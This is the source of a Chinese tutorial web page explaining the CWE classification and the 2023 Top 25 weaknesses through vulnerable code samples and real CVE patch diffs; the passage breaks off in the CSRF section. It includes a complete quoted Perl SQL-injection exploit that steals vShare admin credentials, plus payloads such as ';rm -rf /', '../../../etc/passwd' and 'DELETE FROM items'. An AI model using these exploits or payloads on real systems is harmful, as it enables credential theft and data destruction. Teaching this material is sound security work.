import X from 'src/component/X';
import metas from 'src/app/_metas';

const pathname = '/24b/learn-cwes/';
export const metadata = {
    title: metas[pathname].pagetitle,
    alternates: {
        canonical: metas.baseurl + pathname,
    },
};

export default function Blog() {
    return (
        <>
            <X.Title>{metas[pathname].blogtitle}</X.Title>
            <X.H1 href="https://cwe.mitre.org/index.html">关于CWE</X.H1>
            <X.P>
                *通用缺陷枚举*`(Common Weakness Enumeration, CWE)`是针对硬件和软件弱点和漏洞的分类系统。---
                该项目由美国国土安全部（DHS）网络安全和基础设施安全局（CISA）办公室赞助，由MITRE公司运营。
            </X.P>
            <X.P>
                相比于CVE记录描述产品中出现的漏洞，侧重于漏洞利用的技术影响，CWE对可能导致漏洞的常见缺陷或弱点进行分类，描述漏洞发生的根本原因。
            </X.P>
            <X.H2>术语</X.H2>
            <X.P>
                下面的内容译自@CWE Glossary[https://cwe.mitre.org/documents/glossary/]@，---
                这里只列出了几个下文可能出现的术语：
            </X.P>
            <X.Uli>
                <X.P noMarginBottom>`Behaviour`（行为）</X.P>
                <X.P>产品采取的操作，通常以代码实现或以算法表示。也可以指系统以外的其他参与者的操作。</X.P>
            </X.Uli>
            <X.Uli>
                <X.P noMarginBottom>`Resource`（资源）：</X.P>
                <X.P>
                    指在产品运行过程中被访问或修改的对象或实体，例如内存、CPU、文件或套接字。---
                    资源可以是系统级（内存或CPU）、代码级（函数或变量）或应用程序级（cookie或消息）。
                </X.P>
            </X.Uli>
            <X.Uli>
                <X.P noMarginBottom>`Property`（属性）：</X.P>
                <X.P>
                    指某个对系统预期的安全模型很重要的资源或行为，可能随时间变化。比如用户的输入最初是不受信任的，---
                    但经过系统的中和处理后，最终会被认为是受信任的。
                </X.P>
            </X.Uli>
            <X.H2>CWE分类系统</X.H2>
            <X.P>CWE有一套树型的分类系统，CWE提供了一些组织各个条目的结构化描述，例如视图和分类。</X.P>
            <X.P noMarginBottom>
                CWE Views是针对特定目的或特定受众而组织的弱点集合，大多数视图是整个CWE列表的子集。例如@CWE
                List[https://cwe.mitre.org/data/index.html]@中给出的：
            </X.P>
            <X.Uli>@View by Software Development[https://cwe.mitre.org/data/definitions/699.html]@</X.Uli>
            <X.Uli>@View by Hardware Design[https://cwe.mitre.org/data/definitions/1194.html]@</X.Uli>
            <X.Uli>@View by Research Concepts[https://cwe.mitre.org/data/definitions/1000.html]@</X.Uli>
            <X.P withMarginTop>CWE Categories是更细的划分，一个CWE分类可能包含一系列具有共同特征的CWE条目。</X.P>
            <X.P>
                CWE的不同条目也具有不同的抽象程度，有些条目描述了具体的缺陷，有些则描述了更一般的问题。---
                CWE的条目之间也存在父级子级的关系。四种抽象程度如下图所示：
            </X.P>
            <X.Image src="weakness_abstractions.png" width="600px" invertInDarkTheme />
            <X.P>这些分级在官网上也有对应的图标表示，相应的释义为：</X.P>
            <X.Table
                fromJSX={[
                    ['icon', '释义'],
                    [<X.Image src="view.png" width="16px" center />, '`View`，视图。'],
                    [
                        <X.Image src="category.png" width="16px" center />,
                        '`Category`，分类，一系列有共同特征的CWE条目。',
                    ],
                    [
                        <X.Image src="pillar.png" width="16px" center />,
                        '`Pillar`，最抽象的CWE条目类型，但与`Category`相比，仍然是从“技术上”对缺陷类型进行描述。',
                    ],
                    [
                        <X.Image src="class.png" width="16px" center />,
                        '`Class`，较为抽象的CWE条目类型，通常独立于特定的语言或技术。\\n`Class`级别的CWE通常从【行为、属性、资源】中的`1`~`2`个方面来描述问题。',
                    ],
                    [
                        <X.Image src="base.png" width="16px" center />,
                        '`Base`，较为抽象的CWE条目类型，通常也是独立于资源或技术。\\n`Base`级别的CWE通常从【行为、属性、技术、语言、资源】中的`2`~`3`个方面来描述问题。',
                    ],
                    [
                        <X.Image src="variant.png" width="16px" center />,
                        '`Variant`，通常与特定种类的产品有关系，一般包含特定的语言或技术。\\n`Variant`级别的CWE通常从【行为、属性、技术、语言、资源】中的`3`~`5`个方面来描述问题。',
                    ],
                    [
                        <X.Image src="composite.png" width="16px" center />,
                        '`Composite`，此类缺陷需要多种缺陷同时存在，才会引发潜在的安全漏洞。数量较少。',
                    ],
                    [
                        <X.Image src="chain.png" width="30px" center />,
                        '`Chain`，呈链式关系，例如缺陷X为缺陷Y的发生创造了条件。数量较少。\\n`Chain`可以涉及两个以上的弱点，在某些情况下也可能具有树状结构。',
                    ],
                ]}
            />
            <X.H1>View of CWE Top 25 (2023)</X.H1>
            <X.P>
                （2023年）前25个最危险的软件缺陷，按顺序排名。标题前的【`P`/`C`/`B`/`V`/`Compo`】标识了其抽象类型。
            </X.P>
            <X.H2 href="https://cwe.mitre.org/data/definitions/787.html">【B】CWE-787: Out-of-bounds Write</X.H2>
            <X.P>越界写入，在预期缓冲区末尾之后或开头之前写入。</X.P>
            <X.H3>Example 1</X.H3>
            <X.CodeBlock
                language="c"
                code={`
                int id_sequence[3];

                /* Populate the id array. */

                id_sequence[0] = 123;
                id_sequence[1] = 234;
                id_sequence[2] = 345;
                id_sequence[3] = 456;
                `}
            />
            <X.P>写入`id_sequence[3]`越界了。</X.P>
            <X.H3>Example 2</X.H3>
            <X.CodeBlock
                language="c"
                code={`
                int returnChunkSize(void *)
                {
                    /* if chunk info is valid, return the size of usable memory,
                    * else, return -1 to indicate an error.
                    */
                    ...
                }
                int main()
                {
                    ...
                    memcpy(destBuf, srcBuf, (returnChunkSize(destBuf) - 1));
                    ...
                }
                `}
            />
            <X.P>
                `returnChunkSize()`遇到错误会返回`-1`，但是`memcpy()`假定传入的参数是`unsigned`，---
                此时负值会被转换成相当大的数值。
            </X.P>
            <X.H3>Example 3</X.H3>
            <X.CodeBlock
                language="c"
                code={`
                char *copy_input(char *user_supplied_string)
                {
                    int i, dst_index;
                    char *dst_buf = (char *)malloc(4 * sizeof(char) * MAX_SIZE);
                    if (MAX_SIZE <= strlen(user_supplied_string))
                    {
                        die("user string too long, die evil hacker!");
                    }
                    dst_index = 0;
                    for (i = 0; i < strlen(user_supplied_string); i++)
                    {
                        if ('&' == user_supplied_string[i])
                        {
                            dst_buf[dst_index++] = '&';
                            dst_buf[dst_index++] = 'a';
                            dst_buf[dst_index++] = 'm';
                            dst_buf[dst_index++] = 'p';
                            dst_buf[dst_index++] = ';';
                        }
                        else if ('<' == user_supplied_string[i])
                        {
                            /* encode to &lt; */
                        }
                        else
                            dst_buf[dst_index++] = user_supplied_string[i];
                    }
                    return dst_buf;
                }
                `}
            />
            <X.P>
                虽然前面做了长度检查，但是后续的逻辑将`'&'`和`'&lt;'`转为HTML实体时，可能导致长度增长。---
                如果恶意构造包含大量`'&'`的输入，可能导致越界写入。
            </X.P>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2023-0841[https://www.opencve.io/cve/CVE-2023-0841]@</X.Uli>
                <X.Uli>`Exploit`：@[https://github.com/gpac/gpac/issues/2396]@</X.Uli>
                <X.Uli>`Patch`：@[https://github.com/gpac/gpac/commit/851560e3dc8155d45ace4b0d77421f241ed71dc4]@</X.Uli>
                <X.P withMarginTop>补丁：考虑`bytes_skipped`。</X.P>
                <X.CodeBlock
                    language="c"
                    diffRemovedLines="2-3"
                    diffAddedLines="4-5"
                    code={`
                    if (!ctx->in_seek) {
                        if (size > remain) {
                            GF_LOG(GF_LOG_WARNING, GF_LOG_MEDIA, ("[MP3Dmx] truncated frame of size %u (remains %u)\\n", size, remain));
                        if (bytes_skipped + size > remain) {
                            GF_LOG(GF_LOG_WARNING, GF_LOG_MEDIA, ("[MP3Dmx] truncated frame of size %u (remains %d)\\n", size, remain-bytes_skipped));
                            break;
                        }
                        dst_pck = gf_filter_pck_new_alloc(ctx->opid, size, &output);
                        if (!dst_pck) break;
                        memcpy(output, sync, size);
                        gf_filter_pck_set_cts(dst_pck, ctx->cts);
                        gf_filter_pck_set_duration(dst_pck, nb_samp);
                        gf_filter_pck_set_sap(dst_pck, GF_FILTER_SAP_1);
                        gf_filter_pck_set_framing(dst_pck, GF_TRUE, GF_TRUE);
                        if (ctx->byte_offset != GF_FILTER_NO_BO) {
                            gf_filter_pck_set_byte_offset(dst_pck, ctx->byte_offset + bytes_skipped);
                        }
                        gf_filter_pck_send(dst_pck);
                    }
                    `}
                />
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/79.html">
                【B】CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
            </X.H2>
            <X.P>跨站脚本攻击。</X.P>
            <X.HighlightBlock bgcolor="gray">
                <X.P>详见@Learn XSS[/24b/cross-site-scripting/]@。</X.P>
            </X.HighlightBlock>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2014-8958[https://www.opencve.io/cve/CVE-2014-8958]@</X.Uli>
                <X.Uli>
                    `Patch`：@[https://github.com/phpmyadmin/phpmyadmin/commit/d32da348c4de2379482a48661ce968a55eebe5c4]@
                </X.Uli>
                <X.Uli>
                    `Patch`：@[https://github.com/phpmyadmin/phpmyadmin/commit/2ffdbf2d7daa0b92541d8b754e2afac555d3ed21]@
                </X.Uli>
                <X.P withMarginTop>部分补丁的内容：通过`htmlspecialchars()`转义为HTML实体。</X.P>
                <X.CodeBlock
                    language="php"
                    diffRemovedLines="1"
                    diffAddedLines="2"
                    code={`
                    $html .= '<td>' . $type . '<bdo dir="ltr"></bdo></td>';
                    $html .= '<td>' . htmlspecialchars($type) . '<bdo dir="ltr"></bdo></td>';
                    `}
                />
                <X.CodeBlock
                    language="php"
                    diffRemovedLines="1"
                    diffAddedLines="2"
                    code={`
                    $current_size = $_COOKIE['pma_fontsize'];
                    $current_size = htmlspecialchars($_COOKIE['pma_fontsize']);
                    `}
                />
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/89.html">
                【B】CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
            </X.H2>
            <X.P>
                SQL注入，如果用户可控的输入没有被正确的过滤其中可能包含的SQL语法，那么用这部分输入作为完整SQL命令的一部分时，可能发生预期之外的结果。---
                这可用于更改查询逻辑以绕过安全检查，或插入修改后端数据库的其他语句，包括执行系统命令。
            </X.P>
            <X.H3>Example 1</X.H3>
            <X.P>如果一个SQL由用户输入拼接而成，最终的大致示意如下，其中`userName`是用户名，`itemName`由用户输入：</X.P>
            <X.CodeBlock
                language="text"
                code="SELECT * FROM items WHERE owner = <userName> AND itemname = <itemName>;"
            />
            <X.P>此时如果用户名`wiley`输入的`itemName`是`name' OR 'a'='a`，则拼接后的SQL语句是：</X.P>
            <X.CodeBlock
                language="sql"
                code="SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';"
            />
            <X.P>这条语句等价于：</X.P>
            <X.CodeBlock language="sql" code="SELECT * FROM items;" />
            <X.H3>Example 2</X.H3>
            <X.P>
                还是上面的例子，这次假设用户`wiley`输入的`itemName`是`name'; DELETE FROM items; --`，---
                则SQL语句等价于下面的两个请求：
            </X.P>
            <X.CodeBlock
                language="sql"
                code={`
                SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';
                DELETE FROM items;
                --'
                `}
            />
            <X.H3>Example 3</X.H3>
            <X.CodeBlock
                language="php"
                code={`
                $id = $_COOKIE["mid"];
                mysql_query("SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'");
                `}
            />
            <X.P>
                由于cookie是可以在本地修改的，这仍然是一个输入用户可控的例子。注意到PHP语句中的单引号包裹着`$id`，---
                一个可以注入的载荷是`1432' or '1' = '1`。请求会变成：
            </X.P>
            <X.CodeBlock
                language="sql"
                code="SELECT MessageID, Subject FROM messages WHERE MessageID = '1432' or '1' = '1'"
            />
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2018-1000869[https://www.opencve.io/cve/CVE-2018-1000869]@</X.Uli>
                <X.Uli>`Exploit`：@[https://github.com/phpipam/phpipam/issues/2344]@</X.Uli>
                <X.Uli>
                    `Patch`：@[https://github.com/phpipam/phpipam/commit/856b10ca85a24c04ed8651f4e13f867ec78a353d]@
                </X.Uli>
                <X.P withMarginTop>补丁中加入对参数合法性的检验：</X.P>
                <X.CodeBlock
                    language="php"
                    diffAddedLines="4-8"
                    code={`
                    $nat_id   = $_POST['id'];               // nat id
                    $nat_type = $_POST['type'];             // src, dst

                    // validate object type
                    if (!in_array($obj_type, ['subnets', 'ipaddresses'])) { $Result->show("danger", _("Invalid object type"), true); }

                    // validate object id
                    if (!is_numeric($obj_id)) { $Result->show("danger", _("Invalid object id"), true); }
                    `}
                />
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/416.html">【V】CWE-416: Use After Free</X.H2>
            <X.P>使用释放过的指针可能会导致未知的行为发生。</X.P>
            <X.H3>Example 1</X.H3>
            <X.CodeBlock
                language="c"
                code={`
                #include <stdio.h>
                #include <unistd.h>
                #define BUFSIZER1 512
                #define BUFSIZER2 ((BUFSIZER1 / 2) - 8)
                int main(int argc, char **argv)
                {
                    char *buf1R1;
                    char *buf2R1;
                    char *buf2R2;
                    char *buf3R2;
                    buf1R1 = (char *)malloc(BUFSIZER1);
                    buf2R1 = (char *)malloc(BUFSIZER1);
                    free(buf2R1);
                    buf2R2 = (char *)malloc(BUFSIZER2);
                    buf3R2 = (char *)malloc(BUFSIZER2);
                    strncpy(buf2R1, argv[1], BUFSIZER1 - 1);
                    free(buf1R1);
                    free(buf2R2);
                    free(buf3R2);
                }
                `}
            />
            <X.P>`buf2R1`已经被释放过了。</X.P>
            <X.H3>Example 2</X.H3>
            <X.CodeBlock
                language="c"
                code={`
                char *ptr = (char *)malloc(SIZE);
                if (err)
                {
                    abrt = 1;
                    free(ptr);
                }
                ...
                if (abrt)
                {
                    logError("operation aborted before commit", ptr);
                }
                `}
            />
            <X.P>在发生异常时指针已经释放，但随后又在`logError`错误地使用。</X.P>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2018-1000217[https://www.opencve.io/cve/CVE-2018-1000217]@</X.Uli>
                <X.Uli>`Exploit`：@[https://github.com/DaveGamble/cJSON/issues/248]@</X.Uli>
                <X.Uli>
                    `Patch`：@[https://github.com/FSMaxB/cJSON/commit/22a7d04fa004462e0dca35c3cc7809bea38e65f9]@
                </X.Uli>
                <X.P withMarginTop>
                    如果`item`的`string`属性恰好就是`add_item_to_object`的`string`参数的地址，且`constant`为`false`，`cJSON_strdup`会在释放后访问这个字符串。
                </X.P>
                <X.CodeBlock
                    language="c"
                    diffRemovedLines="11-15,18-19,25-26,33-34"
                    diffAddedLines="3-5,20-21,27-28,35,38-45"
                    code={`
                    static cJSON_bool add_item_to_object(cJSON * const object, const char * const string, cJSON * const item, const internal_hooks * const hooks, const cJSON_bool constant_key)
                    {
                        char *new_key = NULL;
                        int new_type = cJSON_Invalid;

                        if ((object == NULL) || (string == NULL) || (item == NULL))
                        {
                            return false;
                        }

                        if (!(item->type & cJSON_StringIsConst) && (item->string != NULL))
                        {
                            hooks->deallocate(item->string);
                        }

                        if (constant_key)
                        {
                            item->string = (char*)cast_away_const(string);
                            item->type |= cJSON_StringIsConst;
                            new_key = (char*)cast_away_const(string);
                            new_type = item->type | cJSON_StringIsConst;
                        }
                        else
                        {
                            char *key = (char*)cJSON_strdup((const unsigned char*)string, hooks);
                            if (key == NULL)
                            new_key = (char*)cJSON_strdup((const unsigned char*)string, hooks);
                            if (new_key == NULL)
                            {
                                return false;
                            }
                    
                            item->string = key;
                            item->type &= ~cJSON_StringIsConst;
                            new_type = item->type & ~cJSON_StringIsConst;
                        }

                        if (!(item->type & cJSON_StringIsConst) && (item->string != NULL))
                        {
                            hooks->deallocate(item->string);
                        }

                        item->string = new_key;
                        item->type = new_type;

                        return add_item_to_array(object, item);
                    }
                    `}
                />
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/78.html">
                【B】CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
            </X.H2>
            <X.P noMarginBottom>操作系统命令注入，类似地，只不过此时是操作系统命令。通常这有两种子类型：</X.P>
            <X.Uli>程序执行某个固定的程序，但是接收外部输入作为程序的参数。</X.Uli>
            <X.Uli>程序将整个输入作为命令重定向到操作系统。</X.Uli>
            <X.H3>Example 1</X.H3>
            <X.CodeBlock
                language="php"
                code={`
                $userName = $_POST["user"];
                $command = 'ls -l /home/' . $userName;
                system($command);
                `}
            />
            <X.P>如果缺乏相应的认证，攻击者可以通过命令分隔符执行攻击命令，例如参数传入`;rm -rf /`，命令就等价于：</X.P>
            <X.CodeBlock language="bash" code="ls -l /home/;rm -rf /" />
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2019-1010200[https://www.opencve.io/cve/CVE-2019-1010200]@</X.Uli>
                <X.Uli>
                    `patch`：@[https://github.com/google/voice-builder/commit/c145d4604df67e6fc625992412eef0bf9a85e26b]@
                </X.Uli>
                <X.P withMarginTop>
                    原本的程序可以通过`req.query.text`注入`cmd`。补丁对字符串过滤特殊字符，并用`child.stdin.write(sanitizedText)`代替`echo`命令。
                </X.P>
                <X.CodeBlock
                    language="js"
                    diffRemovedLines="4-5,8-12,22"
                    diffAddedLines="6,13,23,33-34"
                    code={`
                    /** GET synthesize voice based on a voice model */
                    router.get('/tts', (req, res) => {
                      const { text, type } = req.query;
                      // TODO(twattanavekin): Test Unicode text.
                      const escapedText = JSON.stringify(text).slice(1, -1);
                      const sanitizedText = utils.replaceCharactersWithSpaces(text);

                      // Example command:
                      //  echo "hello" | \${SYNTH_SCRIPT}

                      const cmd = \`echo "\${escapedText}" | \${SYNTH_SCRIPT}\`;
                      console.log(\`Running command - \\n\${cmd}\`);
                      console.log(\`Synthesizing \${sanitizedText}\`);

                      const options = {
                        maxBuffer: 1024 * 1000, // 1 mb buffer
                        cwd: '/tmp/',
                        timeout: 60000, // 1 minute timeout
                        encoding: 'buffer',
                      };

                      exec(cmd, options, (err, stdout, stderr) => {
                      const child = exec(SYNTH_SCRIPT, options, (err, stdout, stderr) => {
                        const errMsg = utils.getExecErrorMessage(err, stderr);
                        if (errMsg) {
                          return res.status(500).send(errMsg);
                        }
                        res.status(200);
                        res.set('Content-Type', 'audio/wav');
                        const data = type === 'base64' ? stdout.toString('base64') : stdout;
                        return res.send(data);
                      });
                      child.stdin.write(sanitizedText);
                      child.stdin.end();
                    });

                    module.exports = router;
                    `}
                />
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/20.html">【C】CWE-20: Improper Input Validation</X.H2>
            <X.P>
                输入验证不当，程序接收输入或数据，但没有验证或者错误地验证输入是否具有安全正确地处理数据所需的属性。
            </X.P>
            <X.H3>Example 1</X.H3>
            <X.P>没有输入验证。</X.P>
            <X.CodeBlock
                language="php"
                code={`
                $birthday = $_GET['birthday'];
                $homepage = $_GET['homepage'];
                echo "生日：$birthday<br>主页：<a href=$homepage>点击此处</a>"
                `}
            />
            <X.P>
                这段程序展示用户的生日和主页，但由于这些参数来自于HTTP请求，攻击者可以构造一个含有`script`标签的钓鱼链接，---
                并通过参数传入，导致恶意脚本在客户端上执行。
            </X.P>
            <X.P>尽管开发者可以限制输入为整数和破折号，攻击者仍有可能提供以下形式的字符串：</X.P>
            <X.CodeBlock language="text" code="2009-01-09--" />
            <X.P>
                如果在SQL语句中使用这些数据，它会将语句的其余部分视为注释。注释可能会禁用语句中其他与安全相关的逻辑。
            </X.P>
            <X.P>XSS攻击或SQL注入只是输入验证不当可能出现的后果中的一小部分。</X.P>
            <X.H3>Example 2</X.H3>
            <X.P>有问题的输入验证。</X.P>
            <X.CodeBlock
                language="java"
                code={`
                private void buildList(int untrustedListSize)
                {
                    if (0 > untrustedListSize)
                    {
                        die("Negative value supplied for list size, die evil hacker!");
                    }
                    Widget[] list = new Widget[untrustedListSize];
                    list[0] = new Widget();
                }
                `}
            />
            <X.P>
                这个示例尝试根据用户指定的值构建列表，并判断了提供值为负的情况，但还是忽略了输入`0`值的情况，可能导致后续抛出异常。
            </X.P>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2008-2223[https://www.opencve.io/cve/CVE-2008-2223]@</X.Uli>
                <X.Uli>`Exploit`：@[https://www.exploit-db.com/exploits/5565]@</X.Uli>
                <X.P withMarginTop>
                    vShare YouTube Clone 2.6中的`group_posts.php`中的SQL注入漏洞，---
                    远程攻击者可以通过`tid`参数执行任意SQL命令。
                </X.P>
                <X.CodeBlock
                    language="perl"
                    highlightLines="16"
                    code={String.raw`
                    #!/usr/bin/perl
                    # Coded by: Saime
                    # vShare Youtube Clone v2.6 (group_posts.php tid) Remote SQL Injection
                    # Author: Saime
                    # URL: http://www.buyscripts.in
                    # Price: $10.00
                    # Date: 8/05/2008
                    # Greetz: BaKo,DrWh4x,optiplex,xprog,cam-man-dan,Tulle,t0pP8uZz,Inspiratio,Novalok,illuz1oN,Untamed and everyone else I forgot!
                    # Site: http://h4ck-y0u.org

                    use LWP;

                    $site = @ARGV[0];
                    $ua = LWP::UserAgent->new;

                    my $injection = 'group_posts.php?tid=1+union+select+1,2,3,4,concat(username,0x3a,email,0x3a,pwd),6,7+from+signup+limit+0,1--';
                    if (@ARGV < 1)
                    {
                        &usage;
                    }
                    else
                    {
                        &exploit()
                    }

                    sub exploit()
                    {
                        print "[+] Exploiting...\n";
                        $passres = $ua->get("http://$site/$injection");
                        $exploitcon = $passres->content;
                        if ($exploitcon =~ m/<b>Topic:<\/b>(.*)<b>(.*):(.*):([a-f0-9]{32})<\/b><br \/>/gmi)
                        {
                            $pass = $4;
                            $admin = $2;
                            $email = $3;
                            print "[+] Admin Password: $pass\n";
                            print "[+] Admin Username: $admin\n";
                            print "[+] Admin Email: $email\n";
                        }
                        else
                        {
                            print "[-] Unable To Get The Password...\n";
                            exit(0);
                        }
                    }
                    sub usage()
                    {
                        print "Usage: ./vshare.pl [host]\n";
                        print "Example: ./vshare.pl www.site.com\n";
                        exit(0);
                    }
                    `}
                />
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/125.html">【B】CWE-125: Out-of-bounds Read</X.H2>
            <X.P>越界读取，在预期缓冲区末尾之后或开头之前读取。</X.P>
            <X.H3>Example 1</X.H3>
            <X.CodeBlock
                language="c"
                code={`
                int getValueFromArray(int *array, int len, int index)
                {
                    int value;

                    // check that the array index is less than the maximum
                    // length of the array
                    if (index < len)
                    {
                
                        // get the value at the specified index of the array
                        value = array[index];
                    }

                    // if array index is invalid then output error message
                    // and return value indicating error
                    else
                    {
                        printf("Value is: %d\\n", array[index]);
                        value = -1;
                    }

                    return value;
                }
                `}
            />
            <X.P>这段代码只检查了`index &lt; len`的情况；在判断条件中还应加入`index &gt;= 0`。</X.P>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2022-1452[https://www.opencve.io/cve/CVE-2022-1452]@</X.Uli>
                <X.Uli>`Exploit`：@[https://huntr.com/bounties/c8f4c2de-7d96-4ad4-857a-c099effca2d6]@</X.Uli>
                <X.Uli>
                    `Patch`：@[https://github.com/radareorg/radare2/commit/ecc44b6a2f18ee70ac133365de0e509d26d5e168]@
                </X.Uli>
                <X.CodeBlock
                    language="c"
                    diffAddedLines="5-8"
                    code={`
                    ...
                    offset += 6;
                    if (attr) {
                        attr->type = R_BIN_JAVA_ATTR_TYPE_BOOTSTRAP_METHODS_ATTR;
                        if (offset + 8 > sz)  {
                            free (attr);
                            return NULL;
                        }
                        attr->info.bootstrap_methods_attr.num_bootstrap_methods = R_BIN_JAVA_USHORT (buffer, offset);
                        offset += 2;
                        attr->info.bootstrap_methods_attr.bootstrap_methods = r_list_newf (r_bin_java_bootstrap_method_free);
                    ...
                    `}
                />
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/22.html">
                【B】CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
            </X.H2>
            <X.P>
                “路径遍历”，产品使用外部输入来构建路径名，该路径名旨在识别位于受限父目录下的文件或目录。但通过使用特殊元素---
                如`../`序列，如果没有经过中和处理，攻击者可能会访问到受限目录之外的文件。
            </X.P>
            <X.P>
                上述风险称为“相对路径遍历”，路径遍历还包括使用绝对路径名，例如`/usr/local/bin`，这称为“绝对路径遍历”。
            </X.P>
            <X.P>
                在许多编程语言中，注入空字节可能允许攻击者截断生成的文件名，以扩大攻击范围。例如，产品可能会将`".txt"`---
                添加到路径名后以限制攻击者只能访问文本文件，但空注入可能会有效地消除此限制。
            </X.P>
            <X.H3>Example 1</X.H3>
            <X.CodeBlock
                language="perl"
                code={`
                my $dataPath = "/users/cwe/profiles";
                my $username = param("user");
                my $profilePath = $dataPath."/".$username;

                open(my $fh, "<", $profilePath) || ExitError("profile read error: $profilePath");
                print "<ul>\\n";
                while (<$fh>)
                {
                    print "<li>$_</li>\\n";
                }
                print "</ul>\\n";
                `}
            />
            <X.P>`$username`参数没有验证，攻击者可以构造：</X.P>
            <X.CodeBlock language="text" code="user=../../../etc/passwd" />
            <X.P>最终生成以下路径：</X.P>
            <X.CodeBlock language="text" code="/users/cwe/profiles/../../../etc/passwd" />
            <X.P>等同于访问`/etc/passwd`。</X.P>
            <X.H3>Example 2</X.H3>
            <X.CodeBlock
                language="python"
                code={`
                import os
                import sys
                def main():
                    filename = sys.argv[1]
                    path = os.path.join(os.getcwd(), filename)
                    try:
                        with open(path,'r') as f:
                            file_data = f.read()
                    except FileNotFoundError as    e:
                        print("Error - file not found")
                main()
                `}
            />
            <X.P>
                上述代码会导致“绝对路径遍历”，`os.path.join`如果第二个参数传入绝对路径，则会弃用第一个参数`os.getcwd()`，---
                直接使用第二个参数`filename`。那么传入`/etc/passwd`就可能导致同样的攻击。
            </X.P>
            <X.P>一个正确的做法是：</X.P>
            <X.CodeBlock
                language="python"
                highlightLines="5"
                code={`
                import os
                import sys
                def main():
                    filename = sys.argv[1]
                    path = os.path.normpath(f"{os.getcwd()}{os.sep}{filename}")
                    try:
                        with open(path,'r') as f:
                            file_data = f.read()
                    except FileNotFoundError as    e:
                        print("Error - file not found")
                main()
                `}
            />
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2023-35947[https://www.opencve.io/cve/CVE-2023-35947]@</X.Uli>
                <X.Uli>
                    `Patch`：@[https://github.com/gradle/gradle/commit/1096b309520a8c315e3b6109a6526de4eabcb879]@
                </X.Uli>
                <X.Uli>
                    `Patch`：@[https://github.com/gradle/gradle/commit/2e5c34d57d0c0b7f0e8b039a192b91e5c8249d91]@
                </X.Uli>
                <X.P withMarginTop>
                    Gradle是一款构建工具，侧重于构建自动化和多语言开发支持。在受影响的版本中，当解压Tar压缩包时，---
                    Gradle不会检查文件是否可以写入解压位置之外。这可能导致重要文件在Gradle进程有写入权限的任何地方被覆盖。
                </X.P>
                <X.P>部分补丁的内容：</X.P>
                <X.CodeBlock
                    language="java"
                    diffRemovedLines="1"
                    diffAddedLines="2"
                    code={`
                    String path = tarEntry.getName();
                    String path = safeEntryName(tarEntry);
                    `}
                />
                <X.P>
                    进一步去查找`safeEntryName()`的功能，溯源到---
                    @PathTraversalChecker.java[https://github.com/gradle/gradle/blob/master/platforms/core-runtime/files/src/main/java/org/gradle/internal/file/PathTraversalChecker.java]@---
                    中的以下代码：
                </X.P>
                <X.CodeBlock
                    language="java"
                    highlightLines="21-27"
                    code={String.raw`
                    public class PathTraversalChecker {

                        /**
                         * Checks the entry name for path traversal vulnerable sequences.
                         *
                         * This code is used for path traversal, ZipSlip and TarSlip detection.
                         *
                         * <b>IMPLEMENTATION NOTE</b>
                         * We do it this way instead of the way recommended in <a href="https://snyk.io/research/zip-slip-vulnerability"></a>
                         * for performance reasons, calling {@link File#getCanonicalPath()} is too expensive.
                         *
                         * @throws IllegalArgumentException if the entry contains vulnerable sequences
                         */
                        public static String safePathName(String name) {
                            if (isUnsafePathName(name)) {
                                throw new IllegalArgumentException(format("'%s' is not a safe archive entry or path name.", name));
                            }
                            return name;
                        }

                        public static boolean isUnsafePathName(String name) {
                            return name.isEmpty()
                                || name.startsWith("/")
                                || name.startsWith("\\")
                                || containsDirectoryNavigation(name)
                                || (name.contains(":") && isWindows());
                        }

                        private static boolean containsDirectoryNavigation(String name) {
                            if (!name.contains("..")) {
                                return false;
                            }
                            // We have a .. but if not before a file separator or at the end, it is OK
                            return name.endsWith("\\..")
                                || name.contains("..\\")
                                || name.endsWith("/..")
                                || name.contains("../");
                        }

                        private static boolean isWindows() {
                            return System.getProperty("os.name").toLowerCase(Locale.US).contains("windows");
                        }
                    }
                    `}
                />
                <X.P>其中的核心是高亮的`isUnsafePathName()`函数。</X.P>
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/352.html">
                【Compo】CWE-352: Cross-Site Request Forgery (CSRF)
            </X.H2>
            <X.P>跨站请求伪造。</X.P>
            <X.HighlightBlock bgcolor="gray">
                <X.P>详见@Learn CSRF[/24b/cross-site-request-forgery/]@。</X.P>
            </X.HighlightBlock>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2009-3022[https://www.opencve.io/cve/CVE-2009-3022]@</X.Uli>
                <X.Uli>报告：@[https://jvndb.jvn.jp/ja/contents/2009/JVNDB-2009-000058.html]@</X.Uli>
                <X.P withMarginTop>
                    在bingo!CMS 1.2及更早版本中存在CSRF漏洞，---
